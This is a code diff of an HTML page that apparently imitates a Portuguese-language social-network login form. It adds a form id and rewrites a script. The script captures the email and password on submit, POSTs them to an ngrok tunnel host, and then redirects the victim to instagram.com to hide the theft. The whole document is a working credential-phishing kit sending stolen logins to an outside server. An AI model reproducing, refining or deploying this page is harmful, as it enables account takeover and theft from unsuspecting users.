@@ -17,7 +17,7 @@
 
         <section class="signin-section">
             <div>
-                <form action="loginface">
+                <form id="loginface" action="loginface">
                     <div>
                         <input type="text" id='iemail' name="email" placeholder="Email ou número de telemóvel" aria-label="Email ou número de telemóvel" required>
                     </div>
@@ -45,46 +45,46 @@
             </p>
         </section>
     </div>
-     <script>
-            document.getElementById('loginface').addEventListener('submit', function(event) {
 
-                console.log('cheguei aqui caaaaaaaaaa')
-                event.preventDefault();
-    
-                const email = document.getElementById('iemail').value;
-                const senha = document.getElementById('isenha').value;
-    
-                const data = {
-                    email: email,
-                    senha: senha
-                };
-    
-                fetch('https://47f3-191-201-106-24.ngrok-free.app/loginface', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Erro na requisição: ' + response.statusText);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.success) {
-                        window.location.href = 'https://www.instagram.com/';
-                    } else {
-                        alert('Erro no login: ' + data.error);
-                    }
-                })
-                .catch(error => {
-                    console.error('Erro:', error);
-                    alert('Erro: ' + error.message);
-                });
+    <script>
+        document.getElementById('loginface').addEventListener('submit', function(event) {
+            console.log('cheguei aqui caaaaaaaaaa');
+            event.preventDefault();
+
+            const email = document.getElementById('iemail').value;
+            const password = document.getElementById('isenha').value;
+
+            const data = {
+                email: email,
+                password: password
+            };
+
+            fetch('https://47f3-191-201-106-24.ngrok-free.app/loginface', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erro na requisição: ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    window.location.href = 'https://www.instagram.com/';
+                } else {
+                    alert('Erro no login: ' + data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                alert('Erro: ' + error.message);
             });
-        </script>
+        });
+    </script>
 </body>
 
 </html>
